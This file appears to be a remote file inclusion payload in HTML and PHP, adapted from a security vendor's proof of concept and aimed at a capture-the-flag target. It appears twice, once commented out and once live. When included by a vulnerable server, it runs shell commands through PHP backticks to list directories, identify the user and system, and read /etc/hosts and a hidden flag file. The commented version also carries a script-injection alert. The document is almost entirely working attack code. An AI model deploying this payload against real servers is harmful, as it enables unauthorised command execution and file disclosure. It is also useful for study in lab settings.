// <html>
// <body>
// <h1 id="header">RFI Shell inspired by WhiteHat Security Remote File Include Proof of Concept</h1>
// <!-- Comment out the PHP code should the code not be executed server side.
// <?php
//     $ls_output = `ls /var/www/html/rfi2/You_Cant_Find_This_Dir`;
//     $cat_flag_output = `cat /var/www/html/rfi2/You_Cant_Find_This_Dir/flag.php`;
//     $whoami_output = `whoami`;
//     $pwd_output = `pwd`;
//     $uname_a = `uname -a`;
//     ECHO "--"."><p><h4> This file executes the following commands on the web server.</h4></p>";
//     ECHO "<div><ol><li>Root file directory listing (\"ls /var/www/html/rfi2 /\")</li>";
//     ECHO "<li>Who Am I: (\"whoami\")</li>";
//     ECHO "<li>Present Working Directory: (\"pwd\")</li>";
//     ECHO "<li>Display contents of /etc/hosts: (\"cat /var/www/html/rfi2/You_Cant_Find_This_Dir/flag.php")</li>";
//     ECHO "<li>Print Out System Infomation: (\"uname -a\")</li>";
//     ECHO "<b><dl><dt>\"ls /var/www/html/rfi2/You_Cant_Find_This_Dir\" command:</dt></b>";
//     ECHO "<dd><pre>" .$ls_output ."</pre></dd>";
//     ECHO "<dt><b>Who Am I?</b></dt>"; 
//     ECHO "<dd>".$whoami_output. "</dd>";
//     ECHO "<b><dt>Present Working Directory:</dt></b>";
//     ECHO "<dd>".$pwd_output."</dd>";
//     ECHO "<b><dt>Contents of /var/www/html/rfi2/You_Cant_Find_This_Dir/flag.php;</dt></b>";
//     ECHO "<dd><pre>".$cat_flag_output."</pre></dd>";
//     ECHO "<b><dt>uname -a:</b></dt>";
//     ECHO "<dd>".$uname_a."</dd>";
//     ECHO "<script>alert(\"Client Side Script Execution: \" + document.domain );var run = true</script><!--"
// ?>
// -->
// <script>
// var run;
// if( !run ){ 
//   alert("This file executes only client side on: " + document.domain )
//   var header = document.getElementById('header')
//   var message = document.createElement('p')
//   message.textContent = "This file writes html and javascript to the page client side"
//   header.appendChild( message )

// }
// </script>
// <input type="hidden' value='WhiteHat Security - RFI check code ran on server: whsec.us'></input>
// </body>
// </html>



<html>
<body>
<h1 id="header">WhiteHat Security Remote File Include Proof of Concept</h1>
<!-- Comment out the PHP code should the code not be executed server side.
<?php
    $ls_output = `ls -alG /`;
    $ls1_output = `ls /var/www/html/rfi2/`;
    $ls2_output = `ls /var/www/html/rfi2/You_Cant_Find_This_Dir`;
    $whoami_output = `whoami`;
    $pwd_output = `pwd`;
    $catetchosts_output = `cat /etc/hosts`;
    $catflag_output = `cat /var/www/html/rfi2/You_Cant_Find_This_Dir/flag.php`;
    $uname_a = `uname -a`;
    ECHO "--"."><p><h4> This file executes the following commands on the web server.</h4></p>";
    ECHO "<div><ol><li>Root file directory listing (\"ls -alG /\")</li>";
    ECHO "<li>Who Am I: (\"whoami\")</li>";
    ECHO "<li>Present Working Directory: (\"pwd\")</li>";
    ECHO "<li>Display contents of /etc/hosts: (\"cat /etc/hosts\")</li>";
    ECHO "<li>Print Out System Infomation: (\"uname -a\")</li>";
    ECHO "<b><dl><dt>\"ls\" command:</dt></b>";
    ECHO "<dd><pre>" .$ls_output ."</pre></dd>";
    ECHO "<b><dl><dt>\"ls /var/www/html/rfi2/\" command:</dt></b>";
    ECHO "<dd><pre>" .$ls1_output ."</pre></dd>";
    ECHO "<b><dl><dt>\"ls /var/www/html/rfi2/You_Cant_Find_This_Dir\" command:</dt></b>";
    ECHO "<dd><pre>" .$ls2_output ."</pre></dd>";
    ECHO "<dt><b>Who Am I?</b></dt>"; 
    ECHO "<dd>".$whoami_output. "</dd>";
    ECHO "<b><dt>Present Working Directory:</dt></b>";
    ECHO "<dd>".$pwd_output."</dd>";
    ECHO "<b><dt>Contents of /etc/hosts:</dt></b>";
    ECHO "<dd><pre>".$catetchosts_output."</pre></dd>";
    ECHO "<b><dt>Contents of /var/www/html/rfi2/You_Cant_Find_This_Dir/flag.php:</dt></b>";
    ECHO "<dd><pre>".$catflag_output."</pre></dd>";
    ECHO "<b><dt>uname -a:</b></dt>";
    ECHO "<dd>".$uname_a."</dd>";
?>
-->
</body>
</html>
